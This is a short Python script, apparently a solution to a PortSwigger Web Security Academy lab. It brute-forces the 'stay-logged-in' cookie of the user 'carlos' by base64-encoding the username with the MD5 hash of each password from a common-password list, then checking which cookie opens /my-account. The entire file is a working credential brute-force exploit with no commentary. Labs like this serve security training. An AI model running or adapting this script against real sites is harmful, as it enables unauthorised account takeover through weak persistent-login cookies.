import requests
import base64
import hashlib

LAB_URL = "https://0a42002b0306df248229e7b7005d00ec.web-security-academy.net/"
USERNAME = "carlos"

passwords = [
    "123456","password","12345678","qwerty","123456789","12345",
    "1234","111111","1234567","dragon","123123","baseball",
    "abc123","football","monkey","letmein","shadow","master",
    "666666","qwertyuiop","123321","mustang","1234567890",
    "michael","654321","superman","1qaz2wsx","7777777","121212",
    "000000","qazwsx","123qwe","killer","trustno1","jordan",
    "jennifer","zxcvbnm","asdfgh","hunter","buster","soccer",
    "harley","batman","andrew","tigger","sunshine","iloveyou",
    "2000","charlie","robert","thomas","hockey","ranger",
    "daniel","starwars","klaster","112233","george","computer",
    "michelle","jessica","pepper","1111","zxcvbn","555555",
    "11111111","131313","freedom","777777","pass","maggie",
    "159753","aaaaaa","ginger","princess","joshua","cheese",
    "amanda","summer","love","ashley","nicole","chelsea",
    "biteme","matthew","access","yankees","987654321",
    "dallas","austin","thunder","taylor","matrix","mobilemail",
    "mom","monitor","monitoring","montana","moon","moscow"
]

for pwd in passwords:
    md5 = hashlib.md5(pwd.encode()).hexdigest()
    raw = f"{USERNAME}:{md5}"
    cookie = base64.b64encode(raw.encode()).decode()

    r = requests.get(
        LAB_URL + "/my-account",
        cookies={"stay-logged-in": cookie},
        allow_redirects=False
    )

    if r.status_code == 200:
        print(f"[+] PASSWORD FOUND: {pwd}")
        break
    else:
        print(f"[-] Tried: {pwd}")
